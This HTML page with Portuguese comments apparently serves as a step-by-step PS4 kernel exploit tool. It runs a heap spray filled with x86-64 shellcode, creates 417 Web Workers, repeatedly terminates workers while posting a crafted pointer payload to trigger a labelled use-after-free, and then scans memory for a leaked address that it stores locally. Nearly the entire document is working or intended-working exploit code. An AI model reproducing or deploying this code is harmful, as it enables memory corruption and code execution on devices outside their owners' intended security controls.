<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 MANUAL CONTROL</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
        h1 { font-size: 20px; border-bottom: 1px solid #444; margin-bottom: 20px; }
        
        button {
            display: block; width: 90%; margin: 15px auto; padding: 15px;
            font-size: 18px; font-weight: bold; background: #222; color: #aaa;
            border: 2px solid #444; cursor: pointer; border-radius: 5px;
        }
        
        button:enabled:hover { background: #333; color: #fff; border-color: #fff; }
        button:disabled { opacity: 0.3; cursor: not-allowed; }
        
        .active { background: #004 !important; color: #0ff !important; border-color: #0ff !important; }
        
        #log { 
            font-family: monospace; background: #111; color: #0f0; 
            padding: 10px; border: 1px solid #333; height: 150px; 
            overflow-y: scroll; text-align: left; font-size: 14px; margin-top: 20px;
        }
        
        #result-box {
            display: none; background: #050; color: #fff; padding: 20px; 
            font-size: 24px; font-weight: bold; border: 4px solid #0f0; margin-top: 10px;
        }
    </style>
</head>
<body>

    <h1>KERNEL EXPLORER (MANUAL)</h1>

    <button id="btn1" onclick="step1_Spray()">1. PREPARAR MEMÓRIA (SPRAY)</button>
    <button id="btn2" onclick="step2_Threads()" disabled>2. CRIAR 417 THREADS</button>
    <button id="btn3" onclick="step3_Attack()" disabled>3. DISPARAR GATILHO</button>
    <button id="btn4" onclick="step4_Scan()" disabled>4. ESCANEAR RESULTADO</button>

    <div id="result-box"></div>
    <div id="log">Aguardando comando...</div>

    <script>
        // CONFIGURAÇÃO
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        const ADDR_BYTE_3 = 0x05; // Alvo Leve (0x05000000)

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // SHELLCODE
        const code = new Uint8Array([
            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp] 
            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8]
            0x48, 0x89, 0x07,             // mov [rdi], rax
            0xC3,                         // ret
            0x00, 0x00, 0x00, 0x00,       // Slot Leitura
            0x00, 0x00, 0x00, 0x00        // Slot Leitura
        ]);
        const code32 = new Uint32Array(code.buffer);

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += `> ${msg}<br>`;
            el.scrollTop = el.scrollHeight;
        }

        // PASSO 1: SPRAY LEVE
        function step1_Spray() {
            document.getElementById('btn1').disabled = true;
            document.getElementById('btn1').innerText = "Processando...";
            log("Iniciando Spray (80MB)...");

            setTimeout(() => {
                try {
                    // Criar 160 blocos de 64KB (aprox 80MB total)
                    // Suficiente para cobrir 0x05000000
                    for(let i=0; i<160; i++) {
                        let arr = new Uint32Array(0x4000); 
                        arr.fill(0xC3C3C3C3); // Enche rápido
                        
                        // Injeta shellcode a cada 64 bytes
                        for(let k=0; k < arr.length; k+=64) {
                            arr.set(code32, k);
                        }
                        heapSpray.push(arr);
                    }
                    log("Spray concluído com sucesso.");
                    document.getElementById('btn1').innerText = "1. MEMÓRIA OK";
                    document.getElementById('btn2').disabled = false;
                    document.getElementById('btn2').className = "active";
                } catch(e) {
                    log("ERRO OOM: Reinicie o console.");
                }
            }, 500);
        }

        // PASSO 2: THREADS
        function step2_Threads() {
            document.getElementById('btn2').disabled = true;
            log("Criando threads... (Isso pode demorar)");
            
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    if(workers.length % 50 === 0) log(`Workers: ${workers.length}...`);
                } else {
                    clearInterval(i);
                    log(`417 Threads prontas.`);
                    document.getElementById('btn2').innerText = "2. THREADS OK";
                    document.getElementById('btn3').disabled = false;
                    document.getElementById('btn3').className = "active";
                }
            }, 30);
        }

        // PASSO 3: ATAQUE (Use-After-Free)
        function step3_Attack() {
            document.getElementById('btn3').disabled = true;
            log("Disparando exploit (3 segundos)...");
            
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3; // 0x05

            // Atira freneticamente por 3s
            const atk = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { if(workers.length > 0) workers[0].postMessage(payload); } catch(e){}
            }, 10);

            setTimeout(() => {
                clearInterval(atk);
                log("Cessar fogo! Limpando workers...");
                
                // MATA TUDO PARA LIBERAR MEMÓRIA PARA O SCANNER
                workers.forEach(w => w.terminate());
                workers = [];
                
                document.getElementById('btn3').innerText = "3. ATAQUE FEITO";
                document.getElementById('btn4').disabled = false;
                document.getElementById('btn4').className = "active";
                log("Memória liberada. Pode escanear.");
            }, 3000);
        }

        // PASSO 4: SCANNER
        function step4_Scan() {
            document.getElementById('btn4').disabled = true;
            log("Procurando vazamento...");
            
            let found = false;
            for(let i=0; i<heapSpray.length; i+=2) {
                const arr = heapSpray[i];
                for(let k=0; k<arr.length; k+=64) {
                    let leakIdx = k + 4;
                    if(leakIdx < arr.length) {
                         // Se o valor mudou...
                         if (arr[leakIdx] !== 0 && arr[leakIdx] !== 0) {
                            if(arr[leakIdx+1] !== 0) {
                                report(arr[leakIdx], arr[leakIdx+1]);
                                found = true;
                                break;
                            }
                         }
                    }
                }
                if(found) break;
            }
            
            if(!found) {
                log("FALHA: Nenhum leak encontrado.");
                log("Recarregue a página e tente de novo.");
            }
        }

        function report(low, high) {
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            const addr = `0x${hHigh}${hLow}`;
            
            const box = document.getElementById('result-box');
            box.style.display = 'block';
            box.innerText = `LEAK: ${addr}`;
            log("SUCESSO ABSOLUTO!");
            
            // Salva
            localStorage.setItem('ps4_leak', addr);
        }

    </script>
</body>
</html>
